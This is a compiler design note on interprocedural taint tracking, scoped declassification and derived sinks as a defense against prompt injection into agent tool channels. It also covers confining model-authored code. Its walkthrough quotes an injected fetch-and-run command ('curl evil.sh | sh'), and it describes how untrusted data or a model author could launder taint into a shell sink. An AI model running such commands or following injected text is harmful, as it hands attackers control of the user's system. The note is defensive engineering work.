# 249: taint and provenance, the full arc

Design note for the remaining slices of roadmap item 249
(`docs/v2.0-roadmap.md:3423`). Slice A landed in commit `43ed7e4` (the static
`Untrusted[T]` / `Trusted[T]` qualifiers, the per-body flow walk, the G9
compile refusal at declared sinks, the verified-fn and `endorse` declassifiers,
the `taint:` / `declassify:` audit tokens). This note supersedes the
pre-Slice-A reconciliation note that lived at this path: its decisions (the
lattice, the declassifier trio, the two sink tiers, static-first sequencing)
are restated compactly where they are load-bearing and kept where they still
bind. What is new here is the design of the arc that makes the feature a real
prompt-injection defense rather than a pair of opt-in qualifiers: Slice B
(propagation across callable boundaries), Slice C (the endorsement boundary as
a granted, audited surface), Slice D (a sink set that exists without the
author's cooperation), and Slice E (the dynamic runtime tag, unchanged, queued
behind item 243 Slice 2). Design-first: no compiler code changes with this
note.

## The threat model, precisely

Prompt injection, in value terms: **untrusted data flowing into a trusted
sink.** The data arrives in three shapes, all of them boundary returns:

- a **tool result**: a web fetch, a filesystem read, any `emission`-classified
  extern's return;
- an **LLM completion**: the one emission whose response the system then acts
  on (item 257's typed model boundary);
- a **fetched document**: retrieval content that will sit in a model context.

The sinks are the positions where a value *is* authority:

- a **command**: a shell string, `sh -c`, item 252's terminal tool;
- an **authority selection**: a capability or required-key name, a policy
  update, the `granted` list of the item-330 admission crossing;
- an **instruction channel**: content re-entering an LLM prompt in instruction
  position rather than data position.

[prompt-injection-resistance.md](../prompt-injection-resistance.md) shows that
confinement (G1/G4/G8 plus the item-33 boundary policy) removes the
ambient-authority class outright: injected text cannot make a component reach a
boundary it never declared. Its stated residual risk #1 is the gap this item
closes: injection that stays *within* already-granted capabilities. If a
component legitimately holds `emission[shell]` and fetched text steers what
goes through it, the reach is in-bounds and confinement is satisfied. Taint is
how "the wrong thing through a granted channel" becomes checkable: the wrong
thing is untrusted content flowing into a sink, and that flow is exactly what
an information-flow analysis names.

Two distinct adversaries, one per item, and they compose:

| | item 329 (untrusted AUTHOR) | item 249 (untrusted DATA) |
| --- | --- | --- |
| who is hostile | the model that wrote the `.rvl` source | the content a running composition consumes |
| the attack | declare an escape hatch, reach past the grant | steer a granted channel via injected text |
| the defense | admission profile: `no_extern` + the granted allowlist ([admit_profile.py](../../src/revl/admit_profile.py:49)) | G9: untrusted data cannot directly create authority |
| status | landed (329/330) | Slice A landed; this note designs the rest |

The composed case is the lighthouse one: a model-authored turn (untrusted
author) processing a fetched page (untrusted data). Section "Composing with
the untrusted-author profile" below works that case in full, because it is
where Slice A's opt-in surface fails hardest: every qualifier Slice A trusts
is authored by the party 329 refuses to trust.

### What Slice A models today

A boundary return declared `Untrusted[T]` mints a coarse origin (`web`, `net`,
`fs`, `model`, `input`, `secret`; [taint.py](../../src/revl/taint.py:56),
derived from the crossing's capability scope at
[taint.py](../../src/revl/taint.py:115), never guessed). A parameter declared
`Trusted[T]` marks a sink. A per-body walk joins taint through expressions and
refuses an untrusted value reaching a sink, as a compile error tagged G9
([diagnostics.py](../../src/revl/diagnostics.py:33)). Two declassifiers exist:
a `verified fn` whose return mentions `Trusted[...]`, and the ambient
`endorse(v)` builtin. Provenance lands on the G8 audit surface as `taint:` and
`declassify:` crossing tokens ([audit_diff.py](../../src/revl/audit_diff.py:59))
so `revl audit --diff` fails on a newly-routed taint edge or a newly-added
endorse, the same way it fails on one more emission.

### What is still missing, named

1. **Propagation stops at every unannotated callable boundary.** The walk is
   per-body; taint dies when a value crosses into a callee whose parameter
   carries no qualifier. A two-component relay laundering a fetch into a shell
   sink compiles today (proved by construction below).
2. **The endorsement boundary is ambient.** `endorse(v)` needs no grant, no
   capability, no reason, and is callable by a 329-admitted model turn; a
   model turn may equally declare its own laundering `verified fn`. The only
   gate on laundering is the audit diff after the fact.
3. **The sink set is opt-in.** Every sink exists only where an author wrote
   `Trusted[T]`. Nothing derives sinks from the classification machinery, the
   policy engine has no taint vocabulary
   ([policy.py](../../src/revl/policy.py:169) parses only reach and approval
   rules), and the model-prompt and admission crossings have no story.

Slices B, C and D close these in order. The organizing rule for all three,
stated once: **sources, sinks and declassification rights are declared by the
side that grants authority (the granted closure's declarations, the capability
scopes, the policy file, the admission profile), never trusted from the side
being confined.** Slice A got the first half right by putting the qualifiers
on declarations; the remaining slices finish it.

## Background: what Slice A landed (measured)

The mechanism, with its seams, since B, C and D all extend it in place:

- **Qualifier surface.** `Untrusted[T]` / `Trusted[T]` are qualifiers
  orthogonal to the base type, stripped into a side table before base
  typecheck ([taint.py](../../src/revl/taint.py:61) `strip_qualifiers`,
  extraction at [taint.py](../../src/revl/taint.py:165)
  `extract_and_normalize`, called from
  [lower.py](../../src/revl/lower.py:4160)). A qualifier-free type is returned
  verbatim, never round-tripped, so a program using no qualifier is
  byte-identical across parse, IR and every backend
  ([taint.py](../../src/revl/taint.py:49) is the fast path; the
  `test_program_without_qualifiers_is_untouched` family in
  [tests/test_taint_provenance.py](../../tests/test_taint_provenance.py) pins
  it).
- **The lattice** (unchanged from the original Decision 2): a value's taint is
  a set of origin labels ordered by inclusion; bottom `{}` is trusted, join is
  set union ([taint.py](../../src/revl/taint.py:257) `_join`), so a trusted
  prefix never launders an untrusted suffix. Deliberately the same shape as
  the emission-capability sets `_emitting_capabilities` computes
  ([emission_analysis.py](../../src/revl/emission_analysis.py:99)), which is
  the machinery Slice B reuses.
- **The walk.** `_FlowChecker` ([taint.py](../../src/revl/taint.py:268))
  threads a per-binding environment through one callable body. Concatenation
  and interpolation join; every unmodelled node falls through to a
  union-of-children rule ([taint.py](../../src/revl/taint.py:378)) so taint
  only ever disappears at a literal or a declassifier, the no-false-clean
  invariant *within a body*. An ordinary call's result is tainted iff any
  argument is ([taint.py](../../src/revl/taint.py:387)), the intra-body
  over-approximation.
- **The refusal.** An untrusted value into a `Trusted[T]` parameter raises G9
  with the origin, the sink kind, and the shortest tainting path; refusals
  ride the item-386 multi-error collection
  ([lower.py](../../src/revl/lower.py:4424)). G9 is registered with its fix
  line ([diagnostics.py](../../src/revl/diagnostics.py:33) and `:64`), covered
  by the guarantee-totality test.
- **Declassifiers.** A `verified fn` whose return mentions `Trusted[...]`
  (total by G7, so the failure branch is a typed `Result`, not a smuggled
  string), and `endorse(v)`, an ambient builtin
  ([lower.py](../../src/revl/lower.py:671)) that is identity on the base type
  and is spliced out of the IR after the verdict
  ([taint.py](../../src/revl/taint.py:501), applied at
  [lower.py](../../src/revl/lower.py:4609)) so no emitter or golden ever sees
  it.
- **Provenance.** Per-component origins that reach an emission, and origins
  declassified, fold onto the IR entry and the G8 boundary table
  ([__main__.py](../../src/revl/__main__.py:221)), becoming
  `taint:<component>:<origin>` and `declassify:<component>:<origin>` crossing
  tokens ([audit_diff.py](../../src/revl/audit_diff.py:59)) that the drift
  gate treats as widenings.

What Slice A honestly is: a sound per-body checker for a **trusted author**
who annotates. It ships the G9 guarantee shape and the audit surface. It is
not yet a defense an adversary has to beat, for the three reasons above.

## Hole 1, proved by construction: the unannotated relay

This program compiled clean before Slice B. It is the canonical injection
flow, a fetched page reaching a shell command, laundered through nothing more
than an unannotated service method in the middle; Slice B now refuses it at G9
(the `reject G9` fence below):

```revl reject G9
extern emission[web] fn fetch(url: Str) -> Untrusted[Str] = @py { return "" }
extern emission[shell] fn run(cmd: Trusted[Str]) = @py { return }
service Relay { emission fn pass_on(s: Str) }
service Ops { emission fn go(url: Str) }
component Middle provides relay: Relay {
  provide relay { fn pass_on(s) { emit run(s) } }
}
component Agent requires relay: Relay provides ops: Ops {
  provide ops {
    fn go(url) {
      let page = emit fetch(url)
      emit relay.pass_on(page)
    }
  }
}
```

Why it passed before Slice B: the Slice A sink check fired at a call site keyed
on the *callee's* declared `Trusted[T]` parameters. `Relay.pass_on` declares
plain `Str`, so the call from `Agent` checked nothing; and `Middle`'s own body
walk seeded `s` clean because nothing declared it `Untrusted`. Taint died at
the boundary. The direct flow (`emit run(page)` in one body) and the
pure-helper flow (`run(ident(page))`) were both refused already; one hop of
service indirection defeated the checker. Slice B kills exactly this program:
it infers that `Middle.pass_on` carries its parameter into `run`, and refuses
at `Agent`'s `emit relay.pass_on(page)` with the cross-component via chain
`fetch() -> Middle.pass_on -> run`.

The same per-body limit shows up three more ways, all in scope for B:

- **whole-record coarseness**: the union fallback taints a whole constructed
  record when one field is untrusted, so a read of the clean field is dirty,
  pushing authors toward an `endorse` they should not need;
- **no fixpoint over a body**: the walk is single-pass in statement order, so
  a binding that becomes tainted on a back edge (state rebound across an
  iteration construct) is seen clean on its first read;
- **no state threading**: taint stored into component state by one method
  invocation is invisible to the next; the walk has no cross-invocation
  environment.

## Hole 2, proved by the landed tests: laundering is ambient

`endorse(page)` compiles anywhere, with no grant and no reason. And the landed
suite itself demonstrates the second laundering shape, a `verified fn` that
merely forwards:

```revl
verified fn launder(s: Untrusted[Str]) -> Trusted[Str] { return s }
```

`verified` buys totality (G7), not validation quality. For a trusted author
that is the honest contract: a parser that survives review. Composed with item
329 it is a hole: the untrusted-author profile forbids new externs, but a
model-authored turn may freely *call* `endorse` and may freely *declare* the
`launder` fn above, so the entire Slice A discipline is opt-out for the one
author we refuse to trust. Slice C closes both doors.

## Hole 3: sinks exist only where someone wrote `Trusted[T]`

If the granting side forgets the qualifier on the shell extern, there is no
defense at all; nothing in the classification machinery says "a shell-scoped
parameter is a sink". The policy engine cannot say "web taint may not reach
`send.*`" because its grammar has only `may reach` / `may not reach` /
`requires approval` ([policy.py](../../src/revl/policy.py:169), enforcement at
`:668` walking capability reach, not taint tokens), even though the
`taint:` / `declassify:` tokens it would need already land on the audit
surface. And the two crossings that matter most to the lighthouse workload,
the model prompt and the item-330 admission crossing, have no taint story.
Slice D closes this by deriving the sink set from the side that grants
authority.

## Slice B: propagation as an interprocedural fixed point

**The claim B ships:** taint flows through every operation and every call
boundary the emission analysis already walks, with no annotation needed in the
middle. Annotations remain the *interface* discipline; inference does the
interior.

### The propagation rules (normative)

For a value `v` with taint `t(v)`, a set of origin labels:

- **literals and config** are clean: `t(lit) = {}`;
- **concatenation / interpolation / binary ops**: `t(a ++ b) = t(a) ∪ t(b)`;
  a trusted prefix does not launder an untrusted suffix (landed);
- **record construction is field-granular**: building `{a: u, b: t}` gives
  field `a` taint `t(u)` and field `b` taint `t(t)`; a field read takes the
  field's taint, not the record join. Collections join element taint into
  element reads; container metadata (length, presence) is clean unless keys
  are tainted. This replaces the landed whole-record union fallback for the
  shapes the checker models; the union fallback *remains* as the safety net
  for any unmodelled node, preserving no-false-clean;
- **calls**: taint flows argument to result and argument to interior sink
  along the call graph, via inferred per-callable signatures (below);
- **boundary returns**: an `Untrusted[T]`-declared return mints its origin
  (landed); Slice D adds derived minting;
- **declassifiers** are the only edges where taint decreases (landed rule,
  hardened in C).

### Inferred taint signatures over the emission call graph

Lift the per-body walk to a least fixed point over the same call graph
`_emitting_capabilities` walks
([emission_analysis.py](../../src/revl/emission_analysis.py:99)). For every
callable (top-level fn, component provide method, service operation resolved
through a required key), infer a **taint signature**:

- `flows_to_return`: which parameter indices reach the return value;
- `reaches_sink`: which parameter indices reach a sink (transitively, through
  any chain of calls), and which sink;
- `mints`: which origins the body itself joins into the return (from sources
  it calls).

Computation is the same monotone set-union closure as G4's emission fixed
point: seed every signature empty, walk bodies with the landed `_FlowChecker`
extended to record parameter provenance instead of refusing immediately,
iterate to fixpoint (mutual recursion converges because the lattice is finite
and the transfer is monotone), then make one final refusal pass in which every
call site applies the callee's signature: a tainted argument in a
`reaches_sink` position is refused at the *call site*, with a via-chain that
crosses component boundaries (the relay program above refuses at
`emit relay.pass_on(page)` naming `Middle.pass_on -> run` as the path). The
witness-chain shape already exists in the landed `via` tuples
([taint.py](../../src/revl/taint.py:242)); B extends it across bodies, the
same way `_EmissionEvidence` names a G4 chain.

Body-local back edges use the same fixpoint: iterate a body's walk until its
environment stabilizes, so a binding tainted on a back edge is dirty on every
read. Component state joins in as a per-component state environment: every
write of taint into a state binding, from any method, joins into every read,
in any method (methods run in unknown order, so the join over all writers is
the only sound seed).

### The interface rule (was open question 6, now decided)

Inference runs wherever the source is visible: the whole compilation unit,
including all components linked in one `compile_files`. At a **manifest
boundary** (ambient services from an already-running composition, where only
the service declaration is visible), the declaration is the signature: a
parameter is a sink iff declared `Trusted[T]`, a return mints iff declared
`Untrusted[T]`. To keep that boundary honest, `revl audit` grows a per-service
**inferred-signature table** so the granting side can see what inference
learned and promote it into declarations before publishing. A published
declaration that *contradicts* inference (a plain `Str` parameter that
provably reaches a shell sink in the visible source) is a new admission
refusal in B: the declaration must carry the `Trusted[T]`, because consumers
compiled against the declaration alone will rely on it.

### First-class function values

G4 models a bare emitting-callable reference as the unnameable capability `*`.
B mirrors it: a function value carries its callee's taint signature when the
checker can name it (the same first-class tracking the emission fixed point
does), and an indirect call through a value it cannot name is treated as
`reaches_sink = all parameters` when any granted sink exists in the program,
the deliberately over-approximate reading. A tainted argument into an unnamed
callable is therefore refused. This is the `*` philosophy applied to flow:
what cannot be named cannot be proven safe.

### Where it is enforced

Entirely in [taint.py](../../src/revl/taint.py): the `TaintModel` gains the
signature tables, `check_taint` ([taint.py](../../src/revl/taint.py:461))
gains the fixpoint driver, and the call site in
[lower.py](../../src/revl/lower.py:4424) is unchanged. No backend is touched;
the `model.active` gate ([taint.py](../../src/revl/taint.py:149)) keeps a
qualifier-free program byte-identical, and B widens `active` to include
derived sources/sinks only when Slice D's profile turns them on.

## Slice C: the endorsement boundary as a granted surface

**The claim C ships:** the ONLY ways an `Untrusted[T]` becomes `Trusted[T]`
are (1) a checked parser from the trusted closure, (2) a scoped, reasoned,
policy-forbiddable `endorse` the enclosing declaration admits, and (3) a typed
human approval. All three leave a record on the G8/G9 audit surface; none is
available to an untrusted author's root module.

### The scoped `endorse`

The ambient single-argument `endorse(v)` is superseded (a deliberate breaking
change inside the item; nothing outside the Slice A tests uses it, and no
golden can, since `endorse` splices out of every IR). The C form is scoped and
reasoned, spelled in the same bracket style as `emission[cap]` and the landed
`approval[C]`:

```revl sketch
component Deployer requires sh: Shell provides ops: Ops {
  provide ops {
    // the declaration admits the downgrade: without `endorse[web]` in the
    // method's declared surface, the call below is refused at admission
    emission[shell] endorse[web] fn deploy(url: Str) {
      let page = emit fetch(url)
      let cmd = endorse[web](page, reason = "operator-reviewed template")
      emit sh.run(cmd)
    }
  }
}
```

Three properties, each on an existing seam:

- **declared**: `endorse[<origin>]` must appear in the enclosing method's (or
  service operation's) declaration, exactly as a capability scope does, so the
  interface shows the downgrade and G8 enumerates it; an undeclared `endorse`
  is refused at admission, not discovered in review;
- **reasoned**: the `reason` string is mandatory and lands in the boundary
  table's declassify record, which grows from a bare origin to
  `{origin, method, reason, line}`; the crossing *token* stays
  `declassify:<component>:<origin>` so `audit --diff` keys are stable and a
  new endorse still fails the drift gate as a widening (landed behavior,
  [audit_diff.py](../../src/revl/audit_diff.py:59));
- **policy-forbiddable**: the item-33 policy grammar gains a declassify verb
  (Slice D carries the grammar change; the rule reads the landed tokens):

```
component *          may not declassify web
realm billing        may not declassify model, net
capability declassify.web   requires approval
```

### The approval declassifier, on the landed 246 surface

Item 246 shipped typed approvals: `capability C requires approval [ttl]` in
policy, `await approval[C] { fields }` producing a non-persistent
`Approval[C]` ([policy.py](../../src/revl/policy.py:106), the approval body
step at [lower.py](../../src/revl/lower.py:7022), non-persistence enforced at
[typecheck.py](../../src/revl/typecheck.py:220)). C reuses it wholesale: an
`endorse[origin]` under a `capability declassify.<origin> requires approval`
policy rule must be covered by a live `Approval[declassify.<origin>]`, exactly
as an approval-required extern crossing must be. The approval is the
declassification: attributed, ledgered (item 248), and distillable by item 251
into policy scoped to capability x realm x taint-origin
(`docs/v2.0-roadmap.md:3479` already names that key). No new approval
machinery; taint origin becomes one more key on a landed surface.

```revl sketch
fn deploy(url: Str) {
  let page = emit fetch(url)
  let a = await approval[declassify.web] { reason: "ship the fetched template" }
  let cmd = endorse[web](page, reason = "operator ack") with a
  emit sh.run(cmd)
}
```

### Closing hole 2 for the untrusted author

`AdmissionProfile` gains `no_declassify` (on by default in
`untrusted_author`, [admit_profile.py](../../src/revl/admit_profile.py:68)):

- the admitted root module may not call `endorse` in any form;
- a `verified fn` declared in the admitted root whose return mentions
  `Trusted[...]` is **refused structurally** (like `no_extern`, on the parsed
  AST, before lowering): the untrusted author may not mint declassifiers.
  Refused loudly rather than silently ignored, so the model gets the repair
  signal instead of a mystery G9 downstream.

Declassification for an admitted turn therefore comes only from the
pre-granted closure: a granted service whose operations are checked parsers,
or a human approval. With B's propagation underneath, there is no third path
to launder through.

The `verified fn` parser remains the preferred by-construction declassifier
for trusted authors, stated with its honest limit: `verified` proves
totality, not validation quality; the audit's new declassifier table (C lists
every declassifier fn next to the endorse records) is the review surface.

## Slice D: the sink set, derived from the granting side

**The claim D ships:** the dangerous sinks refuse untrusted input even when
no author wrote a qualifier, because sink-ness is derived from the
classification and admission machinery, and the policy engine can gate the
flows that are legitimate but dangerous.

### Two tiers (unchanged decision, now with derivation)

**Absolute-refusal sinks** (a G9 compile error unless declassified). Derived,
not annotated:

| sink | derivation |
| --- | --- |
| shell / exec / terminal parameters | any parameter of a crossing whose capability scope is in the sink-class set (`shell`, `exec`, `terminal`; item 252's terminal tool arrives pre-classified) |
| capability and required-key names | any parameter position the language interprets as a boundary selector; today that is exactly the `granted: List[Str]` parameter of the item-330 admission crossing (`stdlib/admit.rvl:28`) |
| policy updates | any crossing that writes the item-33 policy (none exists in-language today; the row binds the moment one does, e.g. item 251's distilled-rule application) |
| secret sinks | item 256's rows, folded in when 256 lands: `secret:<name>` origin refused at every sink except its bound emission |

The derivation lives beside the landed origin derivation
([taint.py](../../src/revl/taint.py:115) `_origin_of` gets a `_sink_of`
sibling over the same declared capability scopes). The stdlib annotates what
derivation cannot see; the admission crossing's declaration becomes:

```revl sketch
service Admission {
  // the SOURCE is deliberately not a sink: admitting untrusted source is the
  // crossing's whole purpose, and the 329 profile is its validator. The
  // GRANTED list is authority selection: injected text must never choose
  // what a turn is granted.
  emission fn admit(source: Str, granted: Trusted[List[Str]]) -> Str
  ...
}
```

That asymmetry is the item-330 nuance worth stating twice: `source` accepts
untrusted data because the admission gate (profile, allowlist, G1..G9 over
the candidate) IS the sanitizer for programs; `granted` refuses untrusted
data because no gate downstream of it can un-grant what injected text chose.

**Policy-gated sinks** (allowed, but a named, gate-able flow, never a silent
one). Untrusted content legitimately flows outward and into prompts; refusing
that breaks every summarizer. The defense is the item-33 policy over the
landed tokens:

- an outbound send (`net` / `web` / `send` scopes) carrying `web` / `model` /
  `fs` taint is the canonical exfiltration edge of the lethal trifecta; the
  `taint:<component>:<origin>` token already lands
  ([taint.py](../../src/revl/taint.py:441)); D adds the policy vocabulary and
  enforcement:

```
web-taint    may not reach net without approval
model-taint  may not reach fs
```

  parsed next to the existing rules ([policy.py](../../src/revl/policy.py:169)),
  enforced in `enforce` ([policy.py](../../src/revl/policy.py:668)) by reading
  the taint tokens off the same audit graph, violations carrying a
  `taint-flow` why-trace. "without approval" reuses the 246 surface: the flow
  admits iff covered by an `Approval[...]`, which is declassifier three.

- the **model prompt renders provenance, it does not refuse**. Tool results
  are supposed to reach the model; the defense is carrying origin into the
  model context so a harness renders untrusted spans as untrusted to the model
  and the operator (the roadmap's payoff (a), landing with item 257's typed
  boundary: `Ctx` carries per-span origin). The only origin the prompt refuses
  outright is `secret:*`, when 256 lands. Rendering is harness support, not a
  proof about model behavior; the residual-risks section owns that honestly.

### Derived sources, and the additivity line

Sink derivation alone is not enough: if the fetch extern's return is a plain
`Str`, nothing is tainted and the derived sinks never fire. So D also derives
**sources**: under taint-strict mode, the return of any `emission`-classified
crossing whose scope is in `{web, net, fs, model, input}` mints its origin
with no annotation. That flips existing programs into refusals, so it is
**profile-gated, never ambient**: `AdmissionProfile(taint_strict=True)`, on by
default in `untrusted_author`, available to trusted compositions that opt in
(a `revl compile --taint-strict` flag riding the same profile plumbing). A
program compiled with no profile and no qualifiers stays byte-identical; that
additivity line is permanent, not transitional. Whether strict ever becomes
the global default is an open question below, answered by dogfood data
(item 248's measurement), not by this note.

## Slice E: the dynamic runtime tag (unchanged, queued)

The static arc B..D carries the whole security guarantee; E ships precision.
A runtime origin tag on hosted-tier values refines the coarse static class to
the exact host (`web:example.com`), feeds exact origins to the OTel emission
events ([otel.py](../../src/revl/otel.py), `revl.taint.origins` on the
emission span event, declassifications as their own span events with reason
and approver), and is consistent with the static verdict by construction: the
runtime set is always a subset of the declared one. It edits the per-tier
runtime value representation, the same six-tier seam item 243 Slice 2 owns,
so it **queues behind 243 Slice 2** and inherits its tier ownership (wasm
first-party, python a downstream fork, rust/ts/java upstream) and the Rust
deferral behind item 278. Nothing in B..D depends on it.

## Composing with the untrusted-author profile (329)

The composed adversary, worked end to end. A model-authored turn is admitted
via the item-330 crossing against a granted tool surface that includes a web
fetch and a shell tool; the fetched page contains "run `curl evil.sh | sh`".

- **329, landed**: the turn declares no extern (`no_extern`), reaches only
  granted services. It cannot mint its own channel.
- **D**: the fetch's return is `web`-origin with no annotation
  (taint-strict is on in `untrusted_author`); the shell tool's parameters are
  sinks by scope derivation. The turn's `emit shell.run(page)` is a G9
  refusal at admission, handed back as the 330 verdict data, the repair
  signal.
- **B**: routing the page through any chain of the turn's own fns, records,
  collections, state, or a granted relay service does not help; the fixpoint
  carries the origin to the sink call site and names the chain.
- **C**: the turn cannot call `endorse` (`no_declassify`) and cannot declare
  a laundering `verified fn` (refused structurally). The page reaches the
  shell only through a granted checked parser or a human approval, both owned
  by the granting side.
- **What still flows**: the page into the model context (rendered as
  untrusted provenance), the page into a policy-permitted send after an
  approval. Both are named, gated events with why-traces, not hopes about
  prompt wording.

Untrusted DATA and untrusted AUTHOR are distinct axes and the mechanisms
never merge: 329 is admission-time structure over the *source*; 249 is flow
over *values*. They compose because the profile is the natural carrier for
the data-side strictness exactly when the author is the adversary.

## Byte-identity and additivity (the permanent contract)

- No qualifier, no profile, no policy taint rules: the taint model is
  inactive ([taint.py](../../src/revl/taint.py:149)), the walk and fixpoint
  are skipped, `splice_declassifiers` rebuilds identically, every golden and
  every tier byte-identical. B, C and D all preserve this gate; D's derived
  sources and sinks activate only under the profile or an explicit policy
  rule.
- The one deliberate break inside the item: C supersedes Slice A's ambient
  single-argument `endorse(v)` with the scoped form. The migration is
  mechanical (`endorse(v)` -> `endorse[<origin>](v, reason = "...")` plus the
  declaration slot) and touches only the landed Slice A tests; no emitted
  artifact can contain `endorse` (it splices out), so no golden moves.

## Staged implementation plan

Slice A is landed. B, C, D are each independently landable; recommended order
is B, then D, then C's profile hooks (C1/C2 can run parallel to D), because B
is the soundness floor and D is what makes the defense exist without author
cooperation. E queues behind 243 Slice 2.

- **B1 (fn signatures).** Infer `flows_to_return` / `reaches_sink` / `mints`
  for top-level fns; refusal moves to call sites applying signatures; body
  walk iterates to fixpoint. Exit: the pure-helper chain refuses with a
  two-hop via chain; mutual recursion converges; qualifier-free programs
  byte-identical.
- **B2 (cross-component).** Signatures for provide methods and service
  operations resolved through required keys; the manifest-boundary rule (a
  visible-source contradiction between declaration and inference refuses; the
  audit prints the inferred-signature table). Exit: the relay program in this
  note refuses G9 (flip its fence marker to `reject G9`); the via chain names
  both components.
- **B3 (shapes and state).** Field-granular records, element-granular
  collections, the per-component state environment. Exit: a clean field of a
  mixed record flows into a sink; a tainted field refuses; taint written to
  state in one method refuses at a sink in another.
- **B4 (function values).** Signature-carrying function values; the
  over-approximate unnamed-callee rule. Exit: a sink-reaching closure passed
  as a value refuses at the indirect call with tainted args.
- **C1 (scoped endorse).** Parser and lower for `endorse[origin](v, reason =
  ...)` and the `endorse[origin]` declaration slot; the enriched declassify
  record on the boundary table; ambient `endorse(v)` refused with a
  migration hint. Exit: undeclared endorse refuses at admission; the audit
  record carries origin, method, reason, line; `audit --diff` still fails on
  a new endorse.
- **C2 (approval binding).** `capability declassify.<origin> requires
  approval` and the `with a` coverage check on the landed 246 surface. Exit:
  an endorse under the rule without a live `Approval[declassify.origin]`
  refuses; with one, admits and ledgers.
- **C3 (profile).** `no_declassify` in `AdmissionProfile`, on in
  `untrusted_author`: root-module endorse calls and root-declared
  `Trusted`-returning verified fns refused structurally. Exit: the admitted
  turn from the composed walkthrough gets its verdict as data; the same
  source admits when the declassifier moves into the granted closure.
- **D1 (derived sinks).** `_sink_of` over capability scopes; the
  `granted`-parameter sink on the admission crossing; stdlib annotations.
  Exit: an unannotated shell-scoped extern refuses untrusted input under
  strict mode; `admit(source, granted)` refuses a tainted `granted` and
  accepts a tainted `source`.
- **D2 (policy vocabulary).** `<origin>-taint may not reach <cap> [without
  approval]` and `may not declassify <origin>` parsed and enforced over the
  landed tokens, with `taint-flow` why-traces. Exit: a policy-forbidden
  web-taint send refuses at admission naming the chain; with `without
  approval` and a live approval it admits.
- **D3 (strict sources).** `taint_strict` on the profile and CLI; on in
  `untrusted_author`. Exit: strict mode refuses the unannotated
  fetch-to-shell program; no-profile compile of the same program is
  byte-identical to pre-249.
- **D4 (prompt provenance).** Origin spans into the model-boundary context,
  with item 257. Exit: harness-side; a tool result's origin is present on the
  span the harness renders.
- **E (runtime tag).** After 243 Slice 2, per its tier ownership. Exit: OTel
  emission events carry exact origins; runtime origin sets are subsets of
  static ones on a differential corpus.

## Exit tests (the arc's definition of done)

The four headline flows, plus the per-slice gates above:

1. **An untrusted tool result reaching a command sink is refused**, in every
   shape: direct (landed), through a pure helper (landed), through an
   unannotated cross-component relay (B2), through record fields, state and
   closures (B3/B4), and with zero annotations under the untrusted-author
   profile (D1/D3). The refusal is G9 with a via chain naming every hop.
2. **An endorsed value passes**: through a granted checked parser (landed),
   through a declared `endorse[origin]` with reason (C1), and through an
   approval-covered endorse under a `requires approval` rule (C2); each
   leaves its declassify record, and `revl audit --diff` fails when any of
   them is newly added.
3. **Propagation**: concat and interpolation join (landed); a field read of
   an untrusted record field is untrusted while a sibling clean field is
   clean (B3); a call passing an untrusted argument taints exactly the
   positions the callee's inferred signature says (B1/B2).
4. **Additivity**: a program using neither qualifier, no profile and no taint
   policy rule is byte-identical across parse, IR, every backend golden and
   the audit surface, before and after each slice lands (landed test,
   re-asserted per slice; the per-backend golden suites run per the
   backend-golden gap rule, not just `pytest tests/`).

## Residual risks (stated before someone finds them the hard way)

1. **A lying classification lies about taint** (the G8 caveat, unchanged).
   Origins and derived sinks come from declared capability scopes; an extern
   that reads the network but is declared `pure` mints nothing. Same trust
   boundary as capabilities and witnessed status; same family as
   prompt-injection-resistance residual #3.
2. **In-policy misuse within one origin.** Taint stops untrusted content from
   creating authority; it does not judge the content of a trusted-origin,
   in-bounds write. Residual #1's core, narrowed but not erased.
3. **The static half over-approximates.** Field granularity (B3) and
   signatures (B1) shrink the false-positive pressure toward spurious
   endorsement, and E removes most of the rest; until then a strict-mode
   refusal can be wrong about a specific run, and the honest answer is an
   audited endorse, which is why C makes endorsing loud rather than hard.
4. **A granted endorse is real authority to launder.** Declared, reasoned,
   diffable, policy-forbiddable, approval-gateable, and still a downgrade the
   gate enforces faithfully without knowing the grant was too generous. Same
   shape as an over-broad capability grant.
5. **The sink-class set is a list.** A composition that scopes its command
   channel `emission[cmd]` instead of `emission[shell]` escapes derivation
   until the list or the policy names it. Mitigations: the policy floor (an
   operator can gate any scope), the audit's inferred-signature table making
   the miss visible, and stdlib review keeping the granted closure annotated.
6. **Prompt provenance is rendering, not proof.** D4 lets a harness show the
   model which spans are untrusted; a model may still be persuaded by content
   it was told to distrust. The refusal sinks are what stand behind that
   failure: a persuaded model still cannot reach a sink with tainted data.

## Open questions

1. **The endorse spelling.** `endorse[origin](v, reason = "...")` with an
   `endorse[origin]` declaration slot is proposed here for symmetry with
   `emission[cap]` and `approval[C]`. Confirm the surface before C1; the
   alternative is a statement form (`endorse v for web reason "..."`) that
   reads better but adds a statement kind.
2. **Strict-by-default, ever?** D3 keeps derived sources behind the profile
   permanently. Whether a future major flips strict on globally should be
   decided on item 248's measured prompts-per-session and refusal-rate data,
   not speculatively here.
3. **Signature granularity at the manifest boundary.** B2 requires
   declarations at the ambient boundary and refuses visible contradictions.
   Is param-level `Trusted`/`Untrusted` enough for published interfaces, or
   do service declarations eventually want the full signature
   (`flows_to_return`) so consumers can reason about returns too?
4. **The declassify token's grain.** C enriches the boundary record with
   reason and line but keeps the diff token at `<component>:<origin>`. If two
   endorses of the same origin in one component should diff independently,
   the token needs the method or line, at the cost of diff-key churn on
   refactors. Recommendation: keep the coarse token, let the record carry the
   detail; revisit if audit reviews ask for more.
5. **Deriving `model` sources before 257.** The model boundary today returns
   `Str` from an ordinary emission; strict mode can mint `model` origin off a
   scope named `model`/`llm`, but the clean cut is 257's typed boundary.
   Decide whether D3 ships the scope-name heuristic or waits for 257.
